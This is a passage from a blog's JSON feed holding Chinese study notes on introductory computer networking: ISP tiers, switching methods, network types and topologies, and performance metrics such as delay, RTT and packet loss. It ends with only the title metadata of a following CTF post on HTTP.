data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/84528c8b8a2140fb903ae2f281c82dac.png\" alt></p>\n<ul>\n<li>根据提供服务的覆盖面积大小以及所拥有的 IP 地址数目的不同，ISP 也分为不同层次的 1ISP：<strong>主干 ISP、地区 ISP 和本地 ISP（从层次关系上我们也称为第一层 ISP、第二层 ISP、本地 ISP）</strong>。\n<ul>\n<li>主干 ISP 由几个专门的公司创建和维持，服务面积最大 (一般都能够覆盖国家范围), 并且还拥有高速主干网 (例如 10 Gbit/s 或更高)。有一些地区 ISP 网络也可直接与主干 ISP 相连。</li>\n<li>地区 ISP 是一些较小的 ISP。这些地区 ISP 通过 - 一个或多个主干 ISP 连接起来。它们位于等级中的第二层，数据率也低一些。</li>\n<li>本地 ISP 给用户提供直接的服务 (这些用户有时也称为端用户，强调是末端的用户)。本地 ISP 可以连接到地区 ISP，也可直接连接到主干 ISP。 绝大多数的用户都是连接到本地 ISP 的。本地 ISP 可以是一个仅仅提供互联网服务的公司，也可以是一个拥有网络并向自己的雇员提供服务的企业，或者是一个运行自己的网络的非营利机构 (如学院或大学)。本地 ISP 可以与地区 ISP 或主干 ISP 连接。</li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/3548139e72bb46d59c1968466c612ff8.png\" alt></p>\n<p>说明：因特网发展到今天因为规模太大，已经很难对整个网络的结构给出细致的描述，上图所示的只是一个简单的示意图。</p>\n<h2 id=\"13-因特网的标准化工作\"><a class=\"anchor\" href=\"#13-因特网的标准化工作\">#</a> 1.3 因特网的标准化工作</h2>\n<ul>\n<li>因特网的标准化工作对因特网的发展起到了非常重要的作用。</li>\n<li>因特网在制定其标准上的一个很大的特点是面向公众。\n<ul>\n<li>因特网所有的 RFC (Request For Comments) 技术文档都可从因特网上免费下载；<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pZXRmLm9yZy9yZmMuaHRtbA==\">http://www.ietf.org/rfc.html</span></li>\n<li>任何人都可以随时用电子邮件发表对某个文档的意见或建议。</li>\n</ul>\n</li>\n<li>因特网协会 ISOC 是一个国际性组织，它负责对因特网进行全面管理，以及在世界范围内促进其发展和使用\n<ul>\n<li>因特网体系结构委员会 IAB, 负责管理因特网有关协议的开发；</li>\n<li>因特网工程部 IETF, 负责研究中短期工程问题，主要针对协议的开发和标准化；</li>\n<li>因特网研究部 IRTF, 从事理论方面的研究和开发一些需要长期考虑的问题。</li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/03d6d895817748149a8a24153c252982.png\" alt></p>\n<h2 id=\"14-因特网的组成\"><a class=\"anchor\" href=\"#14-因特网的组成\">#</a> 1.4 因特网的组成</h2>\n<h3 id=\"141-功能划分\"><a class=\"anchor\" href=\"#141-功能划分\">#</a> 1.4.1 功能划分</h3>\n<p>因特网的拓扑结构虽然非常复杂，并且在地理上覆盖了全球，但从功能上看。可以划分为以下两部分。</p>\n<ul>\n<li><strong>边缘部分</strong>：由所有连接在互联网上的<strong>主机</strong>组成。这部分是用户<strong>直接使用</strong>的，用来进行<strong>通信</strong> (传送数据、音频或视频) 和<strong>资源共享</strong>。\n<ul>\n<li>边缘部分中的主机，可以是台或电脑或大型服务器，也可以是笔记本、平板电脑</li>\n<li>可以是智能手机、智能手表</li>\n<li>物联网智能硬件：智能摄像头等</li>\n</ul>\n</li>\n<li><strong>核心部分</strong>：由大量网络和连接这些网络的<strong>路由器</strong>组成。这部分是为边缘部分提供服务的 (提供连通性和交换)。</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/e96ad8542cdc42af883ebf42821546c7.png\" alt></p>\n<h3 id=\"142-边缘部分\"><a class=\"anchor\" href=\"#142-边缘部分\">#</a> 1.4.2 边缘部分</h3>\n<p>1、处在因特网边缘的部分就是连接在因特网上的所有的主机。这些主机又称为<strong>端系统 (end system)</strong>。</p>\n<p>2、“主机 A 和主机 B 进行通信”，实际上是指：“运行在主机 A 上的某个程序和运行在主机 B 上的另一个程序进行通信”。</p>\n<p>3、即 “主机 A 的某个进程和主机 B 上的另一个进程进行通信”。或简称为 “计算机之间通信”</p>\n<p>4、在网络边缘的端系统中运行的程序之间的通信方式通常可划分为两大类：</p>\n<ul>\n<li><strong>客户服务器方式（C/S 方式）</strong>，即 Client/Server 方式\n<ul>\n<li>客户 (client) 和服务器 (server) 都是指通信中所涉及的两个<strong>应用进程</strong></li>\n<li>客户服务器方式所描述的是进程之间<strong>服务和被服务</strong>的关系。</li>\n<li>客户是<strong>服务的请求方</strong>，服务器是<strong>服务的提供方</strong>。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/f7939ddf2055490f9f9a722da3af3995.png\" alt></li>\n<li>客户程序必须知道服务器程序的 IP 地址，不需要特殊的硬件和很复杂的操作系统。</li>\n<li>服务器程序不需要知道客户程序的 IP 地址，但是系统需要不断的运行着，并且需要有强大的硬件和高级的操作系统支持。</li>\n</ul>\n</li>\n<li><strong>对等方式（P2P 方式）</strong>，即 Peer-to-Peer 方式\n<ul>\n<li>对等连接 (peer-to-peer，简写为 P2P) 是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方。</li>\n<li>只要两个主机都运行了对等连接软件（P2P 软件），它们就可以进行平等的、对等连接通信。</li>\n<li>双方都可以下载对方已经存储在硬盘中的共享文档。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/3ddeaf7d60594abdbc56274dda8a70e0.png\" alt></li>\n<li>对等连接方式从本质上看仍然是使用客户服务器方式，只是对等连接中的每一个主机既是客户又同时是服务器。</li>\n<li>例如主机 C 请求 D 的服务时，C 是客户，D 是服务器。但如果 C 又同时向 F 提供服务，那么 C 又同时起着服务器的作用。</li>\n<li>P2P 网络技术的特点体现在以下几个方面：\n<ul>\n<li>非中心化：网络中的资源和服务分散在所有节点上，信息的传输和服务的实现都直接在节点之间进行，可以无需中间环节和服务器的介入，避免了可能的瓶颈</li>\n<li>健壮性：P2P 架构天生具有耐攻击、高容错的优点。由于服务是分散在各个节点之间进行的，部分节点或网络遭到破坏对其它部分的影响很小。</li>\n<li>高性价比：性能优势是 P2P 被广泛关注的一个重要原因。采用 P2P 架构可以有效地利用互联网中散布的大量普通结点，将计算任务或存储资料分布到所有节点上。利用其中闲置的计算能力或存储空间，达到高性能计算和海量存储的目的。</li>\n<li>隐私保护：在 P2P 网络中，由于信息的传输分散在各节点之间进行而无需经过某个集中环节，用户的隐私信息被窃听和泄漏的可能性大大缩小。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"143-核心部分\"><a class=\"anchor\" href=\"#143-核心部分\">#</a> 1.4.3 核心部分</h3>\n<p>1、在网络核心部分起特殊作用的是<strong>路由器 (router)</strong>。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/e06bfa105bb840b090accc00bb6a6d9b.png\" alt><br>\n2、三种交换方式</p>\n<ul>\n<li>电路交换 (Circuit Switching)：电话交换机接通电话线的方式称为电路交换；<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/3143c67bb0cc4470bd739f2d203a9081.png\" alt><br>\n 电话交换机：可以把电话交换机简单地看成是一个有多个开关的开关器，可以将需要通信的任意两部电话的电话线路按需接通，从而大大减少了连接的电话线数量<br>\n从通信资源的分配角度来看，交换 (Switching) 就是按照某种方式动态地分配传输线路的资源；<br>\n 电路交换的三个步骤:\n<ul>\n<li><strong>建立连接</strong>（分配通信资源)</li>\n<li><strong>通话</strong>（一直占用通信资源)</li>\n<li><strong>释放连接</strong>（归还通信资源)<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/1e4aa4b19e2447cabf45c5a0171877f1.png\" alt><br>\n 电路交换的缺点：当用户正在输入和编辑一份待传输的文件时，用户所与用的通信资源暂时未被利用，该通信资源也不能被其他用户利用，宝贵的线路资源就被白白浪费掉了，因此<strong>电路交换的传输效率非常低，不适用于计算机和计算机之间的通信</strong>。</li>\n</ul>\n</li>\n<li>分组交换 (Packet Switching)：<strong>路由器</strong>是实现分组交换 (packet switching) 的关键构件，其任务是<strong>转发收到的分组</strong>，这是网络核心部分最重要的功能\n<ul>\n<li>分组交换则采用<strong>存储转发</strong>技术。如下图所示，<strong>把一个报文划分为几个分组后再进行传送</strong>。通常我们把要发送的整块数据称为一个<strong>报文 (message)</strong>。在发送报文之前，先把较长的报文划分成为一个个更小的等长数据段，例如，每个数据段为 1024<strong>bit（比特）</strong>。在每一个数据段前面，加上一些由必要的控制信息组成的<strong>首部 (header)<strong> 后，就构成了一个</strong>分组 (packet)</strong>。分组又称为 “<strong>包</strong>”，而分组的首部也可称为 “<strong>包头</strong>”。分组是在互联网中传送的数据单元。分组中的 “首部” 是非常重要的，正是由于分组的首部包含了诸如目的地址和源地址等重要控制信息，每一个分组才能在互联网中独立地选择传输路径，并被正确地交付到分组传输的终点。</li>\n<li>分组交换过程<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/d5f5965169cc43fab0e377d8d3d70c77.gif\" alt></li>\n<li>分组交换的特点：构成原始报文的一个个分组在各结点路由器上进行存储转发，并且可以进行差错校验，保证报文的完整性和准确性。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/cece743eb1d8422fa425a6dcf7e4711f.png\" alt></li>\n<li><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/1da17ca19473430db99d358e3ba585d5.png\" alt></li>\n<li><strong>说明：分组交换过程中可能会出现分组丢失、重复等问题在后面的章节会详细介绍报文交换 (Message Switching)</strong></li>\n</ul>\n</li>\n<li><strong>报文交换 (Message Switching)</strong>\n<ul>\n<li>整个报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个节点</li>\n<li>对报文的大小不做限制，因此对接收报文的设备缓存空间有要求<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/a9f89835dc2e43079e7d92b9e957d0fb.png\" alt></li>\n</ul>\n</li>\n<li>三种交换方式的对比<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/11ec65e619c4400abfd8751493b4cbc6.png\" alt></li>\n</ul>\n<h2 id=\"15-计算机网络的分类\"><a class=\"anchor\" href=\"#15-计算机网络的分类\">#</a> 1.5 计算机网络的分类</h2>\n<h3 id=\"151-按照网络的作用范围进行分类\"><a class=\"anchor\" href=\"#151-按照网络的作用范围进行分类\">#</a> 1.5.1 按照网络的作用范围进行分类</h3>\n<p>1、<strong>广域网 WAN（Wide Area Network）</strong>：广域网的作用范围通常为几十到几千公里，因而有时也称为远程网 (long haul network)。<strong>广域网是互联网的核心部分，其任务是通过长距离（例如，跨越不同的国家）运送主机所发送的数据</strong>。连接广域网各结点交换机的链路一般都是高速链路，具有较大的通信容量。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/aa25c3acafad4d1ca3562005852dd29b.png\" alt><br>\n2、<strong>城域网 MAN（Metropolitan Area Network）</strong>：城域网的作用范围一般是一个城市，可跨越几个街区甚至整个城市，其作用距离约为 5 ~50 km。城域网可以为一个或几个单位所拥有，但也可以是一种公用设施，用来将多个局域网进行互连。目前很多城域网采用的是以太网技术，因此有时也常并入局域网的范围进行讨论。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/3f38b0ea3c834991b36e74b1efeb15e2.png\" alt><br>\n3、局域网 LAN（Local Area Network）：局域网一般用微型计算机或工作站通过高速通信线路相连（速率通常在 10 Mbit/s 以上)，但地加士 A 个局城网，但现在局域网已非常右)。在局域网发展的初期，一个学校或工厂往往只拥有一个局域网，但现在局域网已非常广泛地使用，学校或企业大都拥有许多个互连的局域网（这样的网络常称为校园网或企业网)。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/8e394abd45b54bbc9576cf4c22063676.png\" alt><br>\n4、个人区域网 PAN（Personal Area Network）：个人区域网就是在个人工作的地方把属于个人使用的电子设备（如便携式电脑等）用无线技木连接起来，其范围很小，大约在 10 m 左右。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/cda6df83b2f842a9a6f6e35fb770ec0a.png\" alt></p>\n<h3 id=\"152-按网络的线路结构进行分类\"><a class=\"anchor\" href=\"#152-按网络的线路结构进行分类\">#</a> 1.5.2 按网络的线路结构进行分类</h3>\n<p><strong>1、星型</strong><br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/43b518b553524171a73a92b6b3112e01.png\" alt></p>\n<ul>\n<li>星型拓扑结构是目前局域网普遍采用的一种拓扑结构。</li>\n<li>星型拓扑结构是用一个节点作为中心节点，其他节点直接与中心节点相连构成的网络。中心节点可以是文件服务器，也可以是连接设备。常见的中心节点为集线器或者路由器。</li>\n<li>星型拓扑结构的网络属于集中控制型网络，整个网络由中心节点执行集中式通行控制管理，各节点间的通信都要通过中心节点。每一个要发送数据的节点都将要发送的数据发送中心节点，再由中心节点负责将数据送到目地节点。因此，中心节点相当复杂，而各个节点的通信处理负担都很小，只需要满足链路的简单通信要求。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/9eccc955d67c484493b07375717b1034.png\" alt></li>\n<li>优点：\n<ul>\n<li>控制简单。任何一站点只和中央节点相连接，因而介质访问控制方法简单，致使访问协议也十分简单。易于网络监控和管理。</li>\n<li>故障诊断和隔离容易。中央节点对连接线路可以逐一隔离进行故障检测和定位，单个连接点的故障只影响一个设备，不会影响全网。</li>\n<li>方便服务。中央节点可以方便地对各个站点提供服务和网络重新配置。</li>\n</ul>\n</li>\n<li>缺点：\n<ul>\n<li>需要耗费大量的电缆，安装、维护的工作量也骤增。</li>\n<li>中央节点负担重，形成 “瓶颈”，一旦发生故障，则全网受影响。</li>\n<li>各站点的分布处理能力较低。</li>\n</ul>\n</li>\n</ul>\n<p><strong>2、总线型</strong><br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/d5824da01b15490cbaf5117b2f71ab0b.png\" alt></p>\n<ul>\n<li>总线型网络拓扑结构中所有设备都直接与总线相连，它所采用的介质一般也是同轴电缆 (包括粗缆和细缆)，不过现在也有采用光缆作为总线型传输介质的。</li>\n<li>总线结构是指各工作站和服务器均挂在一条总线上，各工作站地位平等，无中心节点控制，公用总线上的信息多以基带形式串行传递，其传递方向总是从发送信息的节点开始向两端扩散，如同广播电台发射的信息一样，因此又称广播式计算机网络。各节点在接受信息时都进行地址检查，看是否与自己的工作站地址相符，相符则接收网上的信息。</li>\n<li>总线型结构的网络特点如下：\n<ul>\n<li><strong>结构简单</strong>：网络各接点通过简单的搭线器（T 头）即可接入网络，施工类似接电视天线。</li>\n<li><strong>走线量小</strong>：星型网络需要从中心集线器向每个网络接点单独甩线，如果不用线槽走线的话，地面上经常爬满一捆一捆的网线。</li>\n<li><strong>成本较低</strong>；总线型网络因用线量小，无需集线器等昂贵的网络设备，不用线槽、接线盒等结构化布局材料，成本要大大低于星型网络。</li>\n<li><strong>扩充灵活</strong>：星型网络在增加接点数目时有时是一件极其痛苦的事，如果在网络最初规划时留的空间较小，可能会遇到下列情况 可能会因为只增加一个接点而必须购买一个交换机；而总线型网络只需增加一段电缆和一个 T 头就可增加一个接点。</li>\n<li><strong>故障诊断和隔离比较困难</strong>：当节点发生故障，隔离起来还比较方便，— 旦传输介质出现故障时，就需要将整个总线切断。</li>\n<li><strong>易于发生数据碰撞</strong>，线路争用现象比较严重。<br>\n<strong>3、环型</strong><br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/132d4d9fd320446ab8200fd68264de19.png\" alt></li>\n</ul>\n</li>\n<li>环型结构由网络中若干节点通过点到点的链路首尾相连形成一个闭合的环，这种结构使公共传输电缆组成环型连接，数据在环路中沿着一个方向在各个节点间传输，信息从一个节点传到另一个节点。</li>\n<li>这种结构的网络形式主要应用于<strong>令牌网</strong>中，在这种网络结构中各设备是直接通过<strong>电缆</strong>来串接的，最后形成一个闭环，整个网络发送的信息就是在这个环中传递，通常把这类网络称之为 &quot;<strong> 令牌环网</strong> &quot;。</li>\n<li>实际上大多数情况下这种拓扑结构的网络不会是所有计算机真的要连接成物理上的环型，一般情况下，环的两端是通过一个阻抗匹配器来实现环的封闭的，因为在实际组网过程中因地理位置的限制不方便真的做到环的两端物理连接。</li>\n<li>什么是令牌环\n<ul>\n<li>令牌环网的媒体接入控制机制采用的是分布式控制模式的循环方法。<strong>在令牌环网中有一个令牌 (Token) 沿着环形总线以逆时针方向在入网节点计算机间依次传递</strong> ，令牌实际上是一个特殊格式的帧，本身并不包含信息，仅控制信道的使用，确保在同一时刻只有一个节点能够独占信道。当环上节点都空闲时，令牌绕环行进。节点计算机只有取得令牌后才能发送数据帧，因此不会发生碰撞。由于令牌在网环上是按顺序依次传递的，因此对所有入网计算机而言，访问权是公平的。</li>\n<li>令牌在工作中有 “闲” 和 “忙” 两种状态。“闲” 表示令牌没有被占用，即网中没有计算机在传送信息；“忙” 表示令牌已被占用，即网中有信息正在传送。希望传送数据的计算机必须首先检测到 “闲” 令牌，将它置为 “忙” 的状态，然后在该令牌后面传送数据。当所传数据被目的节点计算机接收后，数据被从网中除去，令牌被重新置为 “闲”。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/dcaac854f0af46668698b33507d04a0f.gif\" alt></li>\n</ul>\n</li>\n</ul>\n<p><strong>4、网状型</strong><br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/adb2753a3ae4495b84f359001101bd33.png\" alt></p>\n<ul>\n<li>网状拓扑结构，这种拓扑结构主要指各节点通过传输线互联连接起来，并且每一个节点至少与其他两个节点相连，网状拓扑结构具有较高的可靠性，但其结构复杂，实现起来费用较高，不易管理和维护，不常用于局域网</li>\n<li>优点：\n<ul>\n<li>网络可靠性高，一般通信子网中任意两个节点交换机之间，存在着两条或两条以上的通信路径，这样，当一条路径发生故障时，还可以通过另一条路径把信息送至节点交换机。</li>\n<li>网络可组建成各种形状，采用多种通信信道，多种传输速率。</li>\n<li>可选择最佳路径，传输延迟小。</li>\n</ul>\n</li>\n<li>缺点：\n<ul>\n<li>控制复杂，软件复杂。</li>\n<li>线路费用高，不易扩充。</li>\n<li>在以太网中，如果设置不当，会造成广播风暴，严重时可以使网络完全瘫痪。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"16-计算机网络的性能指标\"><a class=\"anchor\" href=\"#16-计算机网络的性能指标\">#</a> 1.6 计算机网络的性能指标</h2>\n<p>常用的计算机网络的性能指标有 7 个：<strong>速率、带宽、吞吐量、时延、往返时间、利用率、丢包率</strong></p>\n<h3 id=\"161-速率\"><a class=\"anchor\" href=\"#161-速率\">#</a> 1.6.1 速率</h3>\n<ul>\n<li>计算机发送的信号是以二进制数字形式的。</li>\n<li>一个二进制数字就是一个比特（bit， binary digit）</li>\n<li>字节：Byte， 1Byte = 8bit (1B = 8b)<br>\n 常用数据量单位：<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/235f1f64977d42b9afd00144075a2148.png\" alt></li>\n<li>速率：连接在计算机网络上的主机在数字信道上传送比特数据的速率，也称为<strong>比特率</strong>或<strong>数据率</strong>。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/485586be89a24f358e7e7acd2ff9f04d.png\" alt></li>\n<li>思考：<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/49bd44c7b8764548ae35050939031ee2.png\" alt></li>\n</ul>\n<h3 id=\"162-带宽\"><a class=\"anchor\" href=\"#162-带宽\">#</a> 1.6.2 带宽</h3>\n<ul>\n<li>在计算机网络中，带宽用来表示网络中某通道传送数据的能力，因此网络带宽表示在单位时间内网络中的某信道所能通过的 “最高数据率”</li>\n<li>单位：b/s (kbs, Mb/s, Gb/s, Tb/s)</li>\n<li>宽带的带宽是 100 兆：出口网速最高 100Mb/s</li>\n</ul>\n<h3 id=\"163-吞吐量\"><a class=\"anchor\" href=\"#163-吞吐量\">#</a> 1.6.3 吞吐量</h3>\n<ul>\n<li>吞吐量表示在单位时间内通过某个网络 (或信道、接口) 的数据量</li>\n<li>吞吐量被经常用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。</li>\n<li>吞吐量受网络的带宽或额定速率的限制<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/9aba8ec8cd0e4488bef10f3b18a3e899.png\" alt></li>\n<li>注意吞吐量和带宽的区别：带宽指的是最大的传输速度，而吞吐量指的是实际传输速度<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/ea0881f79f494bf9927d78ba679536ea.png\" alt></li>\n</ul>\n<h3 id=\"164-时延\"><a class=\"anchor\" href=\"#164-时延\">#</a> 1.6.4 时延</h3>\n<ul>\n<li>时延 (delay 或 latency) 是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。时延是个很重要的性能指标，它有时也称为延迟或迟延。</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/7dc1d67a714c49f1afd475b242d85bd3.png\" alt></p>\n<ul>\n<li>网络中的时延是由以下几个不同的部分组成的：\n<ul>\n<li><strong>发送时延</strong>\n<ul>\n<li>主机或路由器发送数据帧所需要的时间，也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间。</li>\n<li>发送时延的计算公式为：<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/320856b61b254d1bba0ac79b1a1ff1f9.png\" alt></li>\n<li>主机的发送速率和网卡的发送速率、信道的带宽、接口速率有关<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/a0bf536bd9704311b1e565313956469a.png\" alt></li>\n</ul>\n</li>\n<li><strong>传播时延</strong>\n<ul>\n<li>电磁波在信道中传播一定的距离需要花费的时间</li>\n<li>传播时延的计算公式：<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/b85db8e4487047f4a45f605e98c2c85f.png\" alt></li>\n<li>各介质的传播速度：<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/c8168894000842e7ba983d197313ede5.png\" alt></li>\n</ul>\n</li>\n<li><strong>处理时延</strong>\n<ul>\n<li>处理时延指的是主机或者路由器在收到分组信息时花费的时间。例如分析分组的首部、从分组中提取数据部分、查找适当的路由等。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>思考：现在我们暂时忽略处理时延。假定有一个长度为 100 MB 的数据块（这里的 M 显然不是指 10<sup>6 而是指 2</sup>20。B 是字节，1 字节 = 8 比特)。在带宽为 1 Mbits 的信道上 (这里的 M 显然是 10^6）连续发送（即发送速率为 1 Mbit/s)，其发送时延是多少？</strong></li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/6bbc6f6b24bf4c778a274dae4ad2ca5c.png\" alt></p>\n<ul>\n<li>现在把这个数据块用光纤传送到 1000 km 远的计算机。由于在 1000 km 的光纤上的传播时延约为 5 ms，因此在这种情况下，发送 100 MB 的数据块的总时延 = 838.9 s + 0.005 s = 838.9005 s。可见对于这种情况，<strong>发送时延决定了总时延的数值</strong>。如果我们把发送速率提高到 100 倍，即提高到 100 Mbitls，那么总时延就变为 8.389+0.005=8.394 s，缩小到原有数值的 1/100。</li>\n</ul>\n<h3 id=\"165-往返时间\"><a class=\"anchor\" href=\"#165-往返时间\">#</a> 1.6.5 往返时间</h3>\n<ul>\n<li>RTT (Round-Trip Time) 往返时间在计算机网络中它是一个重要的性能指标。表示<strong>从发送端将数据发送到传输媒介开始，到发送端收到来自接收端的确认总共经历的时间（不包含发送时延）</strong>。</li>\n<li><strong>RTT 由三个部分决定：链路的传播时间、末端系统的处理时间、路由器的缓存中的排队和处理时间</strong>。其中前两个部分的值作为一个 TCP 连接相对固定，路由器的缓存中的排队和处理时间会随着整个网络拥塞程度的变化而变化。所以<strong> RTT 的变化在一定程度上反映了网络拥塞程度的变化</strong>。</li>\n<li>例如，A 向 B 发送数据。如果数据长度是 100 MB，发送速率是 100 Mbit/s，那么<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/22fadccbcda2416599d0baeddacbf421.png\" alt></li>\n<li>如果 B 正确收完 100 MB 的数据后，就立即向 A 发送确认。再假定 A 只有在收到 B 的确认信息后，才能继续向 B 发送数据。显然，这需要等待一个往返时间 RTT (这里假定确认信息很短，可忽略 B 发送确认的时间)。如果返回时间 = 2 s，那么可以算出 A 向 B 发送数据的有效数据率为 80Mbit/s。比原来的数据率 100Mbit/s 小很多。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/1804fbb473fd4e22b28e392acc439aad.png\" alt></li>\n</ul>\n<h3 id=\"166-利用率\"><a class=\"anchor\" href=\"#166-利用率\">#</a> 1.6.6 利用率</h3>\n<ul>\n<li>利用率有<strong>信道利用率</strong>和<strong>网络利用率</strong>两种。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/52964d128132432189b59d1f466d1c1b.png\" alt></li>\n<li>根据排队论，当某信道的利用率增大时，该信道引起的时延也会迅速增加。</li>\n<li>如果令 Do 表示网络空闲时的时延，D 表示网络当前的时延，那么在适当的假定条件下，可以用下面的简单公式来表示 D、Do 和利用率 U 之间的关系为：<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/7a5ff44747ee4ac2accc4e76213995f6.png\" alt>\n<ul>\n<li>这里 U 是网络的利用率，数值在 0 到 1 之间；</li>\n<li>当网络的利用率达到 50% 时，时延就要加倍；当网络的利用率超过 50% 时，时延急剧增大；</li>\n<li>当网络的利用率接近 100% 时，时延就趋于无穷大；</li>\n<li>因此，一些拥有较大主干网的 ISP 通常会控制它们的信道利用率不超过 50%。如果超过了，就要准备扩容，增大线路的带宽；<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/a8a3bbab53124844995e4521f57f30ba.png\" alt></li>\n</ul>\n</li>\n<li>因此，<strong>信道利用率并非越高越好</strong></li>\n</ul>\n<h3 id=\"167-丢包率\"><a class=\"anchor\" href=\"#167-丢包率\">#</a> 1.6.7 丢包率</h3>\n<ul>\n<li>丢包率即分组丢失率，是指在一定的时间范围内，传输过程中<strong>丢失的分组数量与总分组数量的比率</strong>。</li>\n<li>丢包率是网络运维人员非常关心的一个网络性能指标，但对于普通用户来说往往并不关心这个指标，因为他们通常意识不到网络丢包。</li>\n<li>分组丢失主要有两种情况:\n<ul>\n<li>分组在传输过程中出现误码，被结点丢弃<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/1019015b3ed94fce941f905fea33c7dd.gif\" alt>\n<ul>\n<li>主机发送的分组在传输过程中出现了误码，当分组进入传输路径中的结点交换机后，被结点交换机检测出了误码。进而被丢弃。</li>\n</ul>\n</li>\n<li></li>\n</ul>\n</li>\n</ul>\n<p>分组到达一台队列已满的分组交换机时被丢弃；在通信量较大时就可能造成网络拥塞<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/c5f234234c66498ba1236e03194f61c9.gif\" alt></p>\n<ul>\n<li>弃。实际上。路由器会根据自身的拥塞控制方法，在输入缓存还未满的时候就主动丢弃分组。</li>\n<li>因此，丢包率反映了网络的拥塞情况：无拥塞时路径丢包率为 0</li>\n<li>轻度拥塞时路径丢包率为 1%~4%</li>\n<li>严重拥塞时路径丢包率为 5%~15%</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/11/CTF-Web-HTTP%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/",
            "url": "https://mangpumo.github.io/2022/11/11/CTF-Web-HTTP%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/",
            "title": "CTF_Web_HTTP原理与实践",
            "date_published": "2022-11-11T04:02:09.000Z",
